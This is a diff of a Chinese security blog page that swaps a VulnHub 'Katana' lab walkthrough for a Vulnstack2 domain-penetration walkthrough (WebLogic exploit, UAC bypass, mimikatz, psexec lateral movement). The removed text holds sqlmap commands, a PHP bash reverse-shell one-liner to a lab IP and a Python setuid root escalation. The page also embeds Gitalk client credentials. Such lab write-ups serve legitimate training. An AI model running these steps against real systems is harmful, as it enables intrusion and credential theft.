@@ -7,13 +7,13 @@
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
 
-<title>Katana walkthrought - P1ay2win&#39;s blog</title>
+<title>[域渗透]Vulnstack2_walkthrough - P1ay2win&#39;s blog</title>
 <meta name="twitter:card" content="summary_large_image">
 <meta property="og:site_name" content="P1ay2win's blog">
 <meta property="og:type" content="website">
-<meta property="og:title" content="Katana walkthrought | P1ay2win's blog">
-<meta property="og:image" content="https://blog.play2win.top/2020/06/19/Katana_walkthough//images/katana.jpg">
-<meta property="twitter:image" content="https://blog.play2win.top/2020/06/19/Katana_walkthough//images/katana.jpg">
+<meta property="og:title" content="[域渗透]Vulnstack2_walkthrough | P1ay2win's blog">
+<meta property="og:image" content="https://blog.play2win.top/2020/10/20/[域渗透]Vulnstack2_walkthrough/">
+<meta property="twitter:image" content="https://blog.play2win.top/2020/10/20/[域渗透]Vulnstack2_walkthrough/">
 
 
 
@@ -73,7 +73,7 @@
         <div class="navbar-brand is-flex-center">
             <a class="navbar-item navbar-logo" href="/">
             
-                <img src="/images/header.png" alt="Katana walkthrought" height="28">
+                <img src="/images/header.png" alt="[域渗透]Vulnstack2_walkthrough" height="28">
                 P1ay2win&#39;s blog
             
             </a>
@@ -128,17 +128,11 @@
                 <div class="column is-8-tablet is-8-desktop is-9-widescreen has-order-2 column-main">
 <div class="card">
     
-    <div class="card-image">
-        <span  class="image is-7by1">
-            <img class="thumbnail" src="/images/katana.jpg" alt="Katana walkthrought">
-        </span>
-    </div>
-    
     <div class="card-content article ">
         
         <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
             <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2020-06-19T01:57:27.000Z">2020-06-19</time>
+                <time class="level-item has-text-grey" datetime="2020-10-20T12:57:27.000Z">2020-10-20</time>
                 
                 <div class="level-item">
                 <a class="has-link-grey -link" href="/categories/靶机/">靶机</a>
@@ -148,7 +142,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    4 分钟 读完 (大约 564 个字)
+                    6 分钟 读完 (大约 967 个字)
                 </span>
                 
                 
@@ -160,54 +154,55 @@
         
         <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
             
-                Katana walkthrought
+                [域渗透]Vulnstack2_walkthrough
             
         </h1>
         <div class="content">
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>武士刀这题作者自评为中级难度。确实，Web方面做着有点迷，提权方面又学到了个小trick。</p>
-<blockquote>
-<p><a href="https://www.vulnhub.com/entry/katana-1,482/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/katana-1,482/</a></p>
-</blockquote>
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>For some reason,I can’t explain.靶机下完好几天了，现在才写walkthrough，主要是太菜了，到现在还没人捞。。。vulnstack2比vulnstack1复杂一点点，但也不难，不过也是设计得不错得一个靶机。感谢红日安全和de1ay师傅提供的靶机。</p>
 <a id="more"></a>
-<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>照样nmap全端口扫描，开了ftp、ssh、samba和http服务。</p>
-<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p- -T 4 192.168.189.135</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/06/19/Katana_walkthough/批注 2020-06-18 161829.png" alt></p>
-<p>先去看看80端口的http服务，dirb扫到了个ebook目录，发现到处都是注入。</p>
-<p><img src="/2020/06/19/Katana_walkthough/批注 2020-06-18 170007.png" alt></p>
-<p>没waf直接上大杀器sqlmap，除了information_schema，还有个ebook库，里面有个admin表，记着管理员密码，其他没什么东西。</p>
-<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.189.135/ebook/book.php?bookisbn=978-1-484217-26-9 --batch -D ebook --tables</span><br><span class="line">sqlmap -u http://192.168.189.135/ebook/book.php?bookisbn=978-1-484217-26-9 --batch -D ebook -T admin --dump</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/06/19/Katana_walkthough/批注 2020-06-18 170728.png" style="width:100%;"></p>
-<p>非DBA用户，sqlmap直接爆破出来管理员密码。</p>
-<p><img src="/2020/06/19/Katana_walkthough/批注 2020-06-18 170900.png" alt></p>
-<p>进到后台又添加书本功能，能上传图片，但实测不管是webshell还是正常图片，都没能成功上传。</p>
-<p><img src="/2020/06/19/Katana_walkthough/批注 2020-06-18 171428.png" alt></p>
-<p><img src="/2020/06/19/Katana_walkthough/批注 2020-06-18 171610.png" style="width:100%;"></p>
-<p>后面看其他的端口，在8088端口发现了个upload页面。一开始用dirb什么也没扫出来，加了个<code>-x</code>参数扫后缀名就出来了。</p>
-<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.189.135:8088/ /usr/share/wordlists/dirb/big.txt -x /usr/share/wordlists/dirb/extensions_common.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/06/19/Katana_walkthough/批注 2020-06-18 164824.png" alt></p>
-<p>上传了一个webshell测试下，发现重命名移去一个新的目录。当前端口试了下都没找到上传的webshell，看下walkthough原来是在其他端口的http服务上。</p>
-<p><img src="/2020/06/19/Katana_walkthough/批注 2020-06-18 184409.png" alt></p>
-<p>在8715端口发现了上传的webshell，在这正确要验证授权，直接用sqlmap跑出来的管理员密码admin就行了。</p>
-<p><img src="/2020/06/19/Katana_walkthough/批注 2020-06-18 191935.png" alt></p>
-<p>一句话反弹了个shell。</p>
-<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="hljs-string">'/bin/bash -c "bash -i &gt;&amp; /dev/tcp/192.168.189.129/4444 0&gt;&amp;1"'</span>);</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/06/19/Katana_walkthough/批注 2020-06-18 211158.png" alt></p>
-<p>用privilege-escalation-awesome-scripts-suite收集信息，没看见有什么能利用的点。</p>
-<p>瞄了下，用个新trick：<strong>Capilities特权操作属性</strong>，其中<strong>CAP_SETUID</strong>属性可通过python、perl提权，<strong>CAP_DAC_READ_SEARCH</strong>可通过tar提权。</p>
-<p>用下面的命令搜索具有Capilities特权操作属性的文件。</p>
-<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">getcap</span> -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/06/19/Katana_walkthough/批注 2020-06-18 212106.png" style="width:100%;"></p>
-<p>python 设置uid，再弹个shell即可提权，命令如下：</p>
-<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/python2.7 -c <span class="hljs-string">'import os; os.setuid(0); os.system("/bin/bash")'</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2020/06/19/Katana_walkthough/批注 2020-06-18 212727.png" alt></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这次也跟vulnstack1一样，划分了两个虚拟网络。子网地址分别为<code>192.168.111.0</code>和<code>10.10.10.0</code>。</p>
+<p><img src="/2020/10/20/[域渗透]Vulnstack2_walkthrough/屏幕截图 2020-10-19 234655.png" alt></p>
+<ul>
+<li>WEB.de1ay.com的两张万卡分别连上VMnet1和VMnet2</li>
+<li>PC.de1ay.com也是连上VMnet1和VMnet2</li>
+<li>DC.de1ay.com则只需要连上VMnet2</li>
+<li>攻击者主机连上VMnet</li>
+</ul>
+<p>最后需要使用账号<code>de1ay\administrator</code>和密码<code>1qaz</code>登录到WEB.de1ay.com，进入到<code>C:\Oracle\Middleware\user_projects\domains\base_domain\bin</code>目录，双击<code>startWebLogic</code>批处理脚本，启动WebLogic。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>WEB.de1ay.com这台主机开放了很多端口，其中80、1433、3389和7001就比较有用，这里7001就是WebLogic的默认端口。另一台主机暂时可能就3389端口比较有用。</p>
+<p><img src="/2020/10/20/[域渗透]Vulnstack2_walkthrough/屏幕截图 2020-10-20 105529.png" alt></p>
+<p>WEB.de1ay.com的80端口进去就是空白页面，扫目录页没有扫到扫东西。</p>
+<p>7001端口直接在浏览器上打开就看到明显是WebLogic的404页面，输入路径<code>/console/login/LoginForm.jsp</code>就能WebLogic的登录界面。</p>
+<p><img src="/2020/10/20/[域渗透]Vulnstack2_walkthrough/屏幕截图 2020-10-20 113153.png" alt></p>
+<h3 id="打点"><a href="#打点" class="headerlink" title="打点"></a>打点</h3><p>既然由WebLogic，那就顺理成章地拿WeblogicScan扫了下，存在CVE-2019-2725。</p>
+<p><img src="/2020/10/20/[域渗透]Vulnstack2_walkthrough/屏幕截图 2020-10-20 150713.png" alt></p>
+<p>刚好msf里有这个洞的利用脚本，直接一把梭getshell。注意这里target默认是unix，用命令<code>set target 1</code>就可以把target设置为Windows。</p>
+<p><img src="/2020/10/20/[域渗透]Vulnstack2_walkthrough/屏幕截图 2020-10-20 151237.png" alt></p>
+<p>最后<code>run</code>就会返回个meterpeter的session，没什么难度。</p>
+<h3 id="BypassUAC"><a href="#BypassUAC" class="headerlink" title="BypassUAC"></a>BypassUAC</h3><p>个人横向移动更喜欢用cobaltstrike，所以用msf的<code>payload_inject</code>把session派生到cobaltstrike。</p>
+<p>在cs上看到session的用户是administrator，准备收集域信息时，遇到了拒绝访问，一开始还以为是360的锅，但在WEB的虚拟机上，看360不为所动。查下资料得知是UAC的问题，用cs4.0提权模块里的svc-exe即可绕过UAC。</p>
+<p><img src="/2020/10/20/[域渗透]Vulnstack2_walkthrough/屏幕截图 2020-10-20 154700.png" alt></p>
+<p>好奇这个svc-exe是什么原理，又搜了下质料得到这样的解释：psexec打自己。</p>
+<h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>绕过UAC后，顺利收集到了域信息，当前用户就是域管理员，域控在里一台机子。</p>
+<p><img src="/2020/10/20/[域渗透]Vulnstack2_walkthrough/屏幕截图 2020-10-20 162707.png" alt></p>
+<p><img src="/2020/10/20/[域渗透]Vulnstack2_walkthrough/屏幕截图 2020-10-20 162930.png" alt></p>
+<p>mimikatz读了一波密码，顺便翻了翻主机上的文件，感觉没什么敏感信息。<code>ipconfig</code>看了下又两个网段，10.10.10.1/24的就是内网网段。arp扫描下内网，有一个域控，另一个就是域成员主机。</p>
+<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>administrator是域管理员，使用administartor的凭证横向移动就行了，但这里遇到个坑，没绕过UAC之前横向移动都失败了，我还以为是设置了某些策略的问题。。。</p>
+<p>使用cs的psexec进行横向移动，Session则选择SYSTEM权限的session。在内网不出网情况下，上线DC只需要像上回那样用smb的Listener即可。</p>
+<p><img src="/2020/10/20/[域渗透]Vulnstack2_walkthrough/屏幕截图 2020-10-20 165622.png" alt></p>
+<p>PC的上线操作也差不多，现在所有的主机都上了线了。</p>
+<p><img src="/2020/10/20/[域渗透]Vulnstack2_walkthrough/屏幕截图 2020-10-20 170017.png" alt></p>
+<p>顺便说下DC.de1ay.com还存在MS17-010，但是用msf的命令执行的payload打一次，session就断一次，太难受了。</p>
+<p>还有最近那个Zerologon也是可以的，毕竟是最新的洞，但那socks代理死活连不上内网/捂脸。只好把网卡直接接到内网。</p>
+<p><img src="/2020/10/20/[域渗透]Vulnstack2_walkthrough/屏幕截图 2020-10-20 191228.png" alt></p>
 
         </div>
         
             <ul class="post-copyright">
-            <li><strong>本文标题：</strong><a href="https://blog.play2win.top/2020/06/19/Katana_walkthough/">Katana walkthrought</a></li>
+            <li><strong>本文标题：</strong><a href="https://blog.play2win.top/2020/10/20/[域渗透]Vulnstack2_walkthrough/">[域渗透]Vulnstack2_walkthrough</a></li>
             <li><strong>本文作者：</strong><a href="https://blog.play2win.top">P1ay2win</a></li>
-            <li><strong>本文链接：</strong><a href="https://blog.play2win.top/2020/06/19/Katana_walkthough/">https://blog.play2win.top/2020/06/19/Katana_walkthough/</a></li>
-            <li><strong>发布时间：</strong>2020-06-19</li>
+            <li><strong>本文链接：</strong><a href="https://blog.play2win.top/2020/10/20/[域渗透]Vulnstack2_walkthrough/">https://blog.play2win.top/2020/10/20/[域渗透]Vulnstack2_walkthrough/</a></li>
+            <li><strong>发布时间：</strong>2020-10-20</li>
             <li><strong>版权声明：</strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
             </li>
             </ul>
@@ -217,7 +212,7 @@
             <div class="level-start">
                 <div class="level-item">
                     <span class="is-size-6 has-text-grey has-mr-7">#</span>
-                    <a class="has-link-grey -link" href="/tags/CAP/">CAP</a>
+                    <a class="has-link-grey -link" href="/tags/域/">域</a>
                 </div>
             </div>
         </div>
@@ -234,17 +229,10 @@
 <div class="card card-transparent">
     <div class="level post-navigation is-flex-wrap is-mobile">
         
-        <div class="level-start">
-            <a class="level level-item has-link-grey  article-nav-prev" href="/2020/06/20/Tre1_walkthrough/">
-                <i class="level-item fas fa-chevron-left"></i>
-                <span class="level-item">Tre1 walkthrought</span>
-            </a>
-        </div>
-        
         
         <div class="level-end">
-            <a class="level level-item has-link-grey  article-nav-next" href="/2020/06/13/CengBox2_walkthrough/">
-                <span class="level-item">CengBox2 walkthrought</span>
+            <a class="level level-item has-link-grey  article-nav-next" href="/2020/10/13/[域渗透]Vulnstack1_walkthrough/">
+                <span class="level-item">[域渗透]Vulnstack1_walkthrough</span>
                 <i class="level-item fas fa-chevron-right"></i>
             </a>
         </div>
@@ -265,7 +253,7 @@
     var gitalk = new Gitalk({
         clientID: '372fb49f2243341bf93b',
         clientSecret: 'b79da9cd60cecc3af662428f1daa6e01b1702d75',
-        id: '4bdf1f9b6f9fdf4817db602d4444b7ce',
+        id: '811cbbe7a90bfb84f9c1fec81f7d7ed9',
         repo: 'p1ay2win.github.io',
         owner: 'p1ay2win',
         admin: "p1ay2win",
@@ -383,10 +371,34 @@
         <span class="has-mr-6">1</span>
         <span>前言</span>
         </a></li><li>
-        <a class="is-flex" href="#利用过程">
+        <a class="is-flex" href="#环境搭建">
         <span class="has-mr-6">2</span>
-        <span>利用过程</span>
-        </a></li></ul>
+        <span>环境搭建</span>
+        </a></li><li>
+        <a class="is-flex" href="#漏洞利用">
+        <span class="has-mr-6">3</span>
+        <span>漏洞利用</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#信息收集">
+        <span class="has-mr-6">3.1</span>
+        <span>信息收集</span>
+        </a></li><li>
+        <a class="is-flex" href="#打点">
+        <span class="has-mr-6">3.2</span>
+        <span>打点</span>
+        </a></li><li>
+        <a class="is-flex" href="#BypassUAC">
+        <span class="has-mr-6">3.3</span>
+        <span>BypassUAC</span>
+        </a></li><li>
+        <a class="is-flex" href="#信息收集-1">
+        <span class="has-mr-6">3.4</span>
+        <span>信息收集</span>
+        </a></li><li>
+        <a class="is-flex" href="#横向移动">
+        <span class="has-mr-6">3.5</span>
+        <span>横向移动</span>
+        </a></li></ul></li></ul>
             </div>
         </div>
     </div>
